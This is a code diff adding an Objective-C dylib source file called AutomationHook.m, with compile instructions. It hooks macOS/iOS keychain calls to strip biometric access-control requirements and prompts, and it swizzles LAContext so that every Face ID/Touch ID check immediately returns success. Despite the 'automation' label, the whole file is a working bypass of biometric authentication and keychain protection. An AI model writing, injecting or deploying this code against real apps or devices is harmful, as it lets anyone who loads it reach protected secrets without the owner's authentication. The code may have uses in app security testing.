@@ -1,0 +1,103 @@
+// AutomationHook.m
+// compile with: clang -shared -undefined dynamic_lookup -o AutomationHook.dylib AutomationHook.m
+#import <Foundation/Foundation.h>
+#import <LocalAuthentication/LocalAuthentication.h>
+#import <Security/Security.h>
+#import <objc/runtime.h>
+#import <dlfcn.h>
+
+// ============================================================================
+// PART 1: KEYCHAIN INTERPOSITION (C Functions)
+// ============================================================================
+
+// Function pointers to store original implementations
+static OSStatus (*original_SecItemAdd)(CFDictionaryRef, CFTypeRef *);
+static OSStatus (*original_SecItemCopyMatching)(CFDictionaryRef, CFTypeRef *);
+
+// Hook for SecItemAdd: Strips the "AccessControl" requirement before saving
+OSStatus SecItemAdd(CFDictionaryRef attributes, CFTypeRef *result) {
+    if (!original_SecItemAdd) original_SecItemAdd = dlsym(RTLD_NEXT, "SecItemAdd");
+
+    NSMutableDictionary *mutableAttrs = [(__bridge NSDictionary *)attributes mutableCopy];
+    
+    if (mutableAttrs[(__bridge id)kSecAttrAccessControl]) {
+        NSLog(@"[AutomationHook] Stripping Biometric Security from Keychain Save");
+        [mutableAttrs removeObjectForKey:(__bridge id)kSecAttrAccessControl];
+    }
+    
+    return original_SecItemAdd((__bridge CFDictionaryRef)mutableAttrs, result);
+}
+
+// Hook for SecItemCopyMatching: Strips the requirement when reading
+OSStatus SecItemCopyMatching(CFDictionaryRef query, CFTypeRef *result) {
+    if (!original_SecItemCopyMatching) original_SecItemCopyMatching = dlsym(RTLD_NEXT, "SecItemCopyMatching");
+
+    NSMutableDictionary *mutableQuery = [(__bridge NSDictionary *)query mutableCopy];
+    
+    if (mutableQuery[(__bridge id)kSecAttrAccessControl]) {
+        NSLog(@"[AutomationHook] Stripping Biometric Security from Keychain Read");
+        [mutableQuery removeObjectForKey:(__bridge id)kSecAttrAccessControl];
+    }
+    // Remove "Operation Prompt" (The text "Login to view...") if present
+    if (mutableQuery[(__bridge id)kSecUseOperationPrompt]) {
+        [mutableQuery removeObjectForKey:(__bridge id)kSecUseOperationPrompt];
+    }
+
+    return original_SecItemCopyMatching((__bridge CFDictionaryRef)mutableQuery, result);
+}
+
+// ============================================================================
+// PART 2: BIOMETRIC SWIZZLING (Objective-C Methods)
+// ============================================================================
+
+@implementation NSObject (BiometricBypass)
+
++ (void)load {
+    static dispatch_once_t onceToken;
+    dispatch_once(&onceToken, ^{
+        NSLog(@"[AutomationHook] Dylib loaded. Initializing Swizzling...");
+        [self swizzleLAContext];
+    });
+}
+
++ (void)swizzleLAContext {
+    Class cls = NSClassFromString(@"LAContext");
+    if (!cls) return;
+
+    // Target method: evaluatePolicy:localizedReason:reply:
+    SEL originalSelector = @selector(evaluatePolicy:localizedReason:reply:);
+    SEL swizzledSelector = @selector(hook_evaluatePolicy:localizedReason:reply:);
+
+    Method originalMethod = class_getInstanceMethod(cls, originalSelector);
+    Method swizzledMethod = class_getInstanceMethod(self, swizzledSelector);
+
+    // Add the new method to LAContext, then swap them
+    BOOL didAddMethod = class_addMethod(cls,
+                                        originalSelector,
+                                        method_getImplementation(swizzledMethod),
+                                        method_getTypeEncoding(swizzledMethod));
+
+    if (didAddMethod) {
+        class_replaceMethod(cls,
+                            swizzledSelector,
+                            method_getImplementation(originalMethod),
+                            method_getTypeEncoding(originalMethod));
+    } else {
+        method_exchangeImplementations(originalMethod, swizzledMethod);
+    }
+}
+
+// Our fake implementation
+- (void)hook_evaluatePolicy:(LAPolicy)policy
+            localizedReason:(NSString *)localizedReason
+                      reply:(void(^)(BOOL success, NSError *error))reply {
+    
+    NSLog(@"[AutomationHook] Intercepted Biometric Prompt. Returning SUCCESS.");
+    
+    // Immediately execute the reply block with Success = YES
+    if (reply) {
+        reply(YES, nil);
+    }
+}
+
+@end
